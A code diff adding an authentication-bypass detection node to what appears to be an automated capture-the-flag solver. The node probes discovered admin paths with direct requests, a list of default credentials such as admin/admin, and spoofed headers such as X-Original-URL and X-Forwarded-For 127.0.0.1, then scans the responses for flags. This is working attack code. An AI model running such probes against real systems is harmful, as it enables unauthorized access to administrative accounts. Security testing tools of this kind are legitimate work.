@@ -261,6 +261,155 @@ class SSRFDetectRequestNode(DecisionNode):
         )
 
 
+class AuthBypassDetectNode(DecisionNode):
+    """W-AB.1: Attempt authentication bypass on discovered admin paths.
+    
+    Tries:
+    1. Direct access (following redirects - do we land somewhere non-login?)
+    2. Common default credentials via form POST
+    3. Common bypass headers (X-Original-URL, path traversal tricks)
+    """
+
+    _DEFAULT_CREDS = [
+        ("admin", "admin"),
+        ("admin", "password"),
+        ("admin", "123456"),
+        ("root", "root"),
+        ("administrator", "administrator"),
+        ("admin", ""),
+    ]
+
+    # If a 200 response still shows any of these it's just the login form re-rendered.
+    _LOGIN_KEYWORDS = [
+        "login", "log in", "log-in", "sign in", "signin", "sign-in",
+        "username", "password", "credentials", "authenticate",
+        "forgot password", "forgot-password",
+    ]
+
+    # Negative confirmation: at least one of these means we really got in.
+    _AUTHED_KEYWORDS = [
+        "logout", "log out", "sign out", "signout", "dashboard",
+        "welcome", "profile", "account", "admin panel", "control panel",
+    ]
+
+    _BYPASS_HEADERS = [
+        {"X-Original-URL": "/admin"},
+        {"X-Rewrite-URL": "/admin"},
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+    ]
+
+    def __init__(self):
+        super().__init__("auth_bypass_detect", "Auth Bypass: Try Admin Paths")
+        self.curl = CurlAdapter()
+
+    def _is_login_page(self, body: str, final_url: str = "") -> bool:
+        """Return True if the response looks like a login/auth wall."""
+        bl = body.lower()
+        url_l = final_url.lower()
+        # URL itself points to login
+        if any(kw in url_l for kw in ["login", "signin", "auth", "logon"]):
+            return True
+        # Must have at least 2 login indicators to avoid false positives
+        hits = sum(1 for kw in self._LOGIN_KEYWORDS if kw in bl)
+        return hits >= 2
+
+    def _is_authed_page(self, body: str) -> bool:
+        """Return True if the response looks like an authenticated page."""
+        bl = body.lower()
+        return any(kw in bl for kw in self._AUTHED_KEYWORDS)
+
+    def run(self, context: Dict[str, Any]) -> NodeResult:
+        observations = context.get("observations", {})
+        challenge = context.get("challenge")
+        if not challenge:
+            return NodeResult(status=NodeStatus.FAILURE, error="No challenge")
+
+        base_url = challenge.url.rstrip("/")
+
+        # Collect admin-like paths from directory scan
+        admin_paths = []
+        for d in observations.get("directories", []):
+            path = d.get("path", "").lower()
+            if any(kw in path for kw in ["admin", "login", "signin", "dashboard", "panel"]):
+                url = (d.get("url") or f"{base_url}/{d['path']}").replace("//", "/").replace(":/", "://")
+                admin_paths.append(url)
+
+        if not admin_paths:
+            admin_paths = [f"{base_url}/admin", f"{base_url}/login"]
+
+        logger.info(f"[auth-bypass] Testing {len(admin_paths)} admin paths")
+        results = []
+        # Collect all response bodies as strings so orchestrator can flag-scan them
+        all_bodies: list = []
+
+        for url in admin_paths[:5]:  # cap at 5 paths
+            # 1. Direct access following redirect
+            try:
+                resp = self.curl.run(url, {"follow_redirects": True, "insecure": True})
+                body = resp.get("body", "")
+                status = resp.get("status", 0)
+                all_bodies.append(body)
+                if status == 200 and not self._is_login_page(body, url) and self._is_authed_page(body):
+                    logger.info(f"[auth-bypass] Direct access succeeded on {url}")
+                    results.append({"url": url, "method": "direct", "status": status})
+            except Exception as e:
+                logger.debug(f"[auth-bypass] Direct probe failed: {e}")
+
+            # 2. Default credentials
+            for username, password in self._DEFAULT_CREDS:
+                try:
+                    resp = self.curl.run(url, {
+                        "method": "POST",
+                        "data": f"username={username}&password={password}",
+                        "follow_redirects": True,
+                        "insecure": True,
+                    })
+                    body = resp.get("body", "")
+                    status = resp.get("status", 0)
+                    all_bodies.append(body)
+                    if status == 200 and not self._is_login_page(body) and self._is_authed_page(body):
+                        logger.info(f"[auth-bypass] Default creds {username}/{password} worked on {url}")
+                        results.append({"url": url, "method": "default_creds",
+                                        "username": username, "password": password,
+                                        "body_preview": body[:300]})
+                except Exception:
+                    pass
+
+            # 3. Header bypass tricks
+            for headers in self._BYPASS_HEADERS:
+                try:
+                    resp = self.curl.run(base_url, {"headers": headers, "follow_redirects": True, "insecure": True})
+                    body = resp.get("body", "")
+                    status = resp.get("status", 0)
+                    all_bodies.append(body)
+                    if status == 200 and not self._is_login_page(body) and self._is_authed_page(body):
+                        logger.info(f"[auth-bypass] Header bypass {headers} worked")
+                        results.append({"url": base_url, "method": "header_bypass", "headers": headers,
+                                        "body_preview": body[:300]})
+                except Exception:
+                    pass
+
+        bypassed = len(results) > 0
+        context["observations"]["auth_bypass_results"] = results
+        logger.info(f"[auth-bypass] Bypass attempted: {bypassed}, confirmed_hits={len(results)}")
+
+        return NodeResult(
+            status=NodeStatus.SUCCESS if bypassed else NodeStatus.FAILURE,
+            data={
+                "bypassed": bypassed,
+                "results": str(results),
+                "paths_tested": admin_paths[:5],
+                # Concatenate all bodies as a single string so orchestrator's
+                # FlagRecognizer can scan for flag{...} / CTF{...} patterns
+                "response_bodies": "\n---\n".join(all_bodies)[:8000],
+            }
+        )
+
+    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
+        return None  # terminal node for now
+
+
 # Summary
 """
 Additional Web Vulnerability Detection Trees
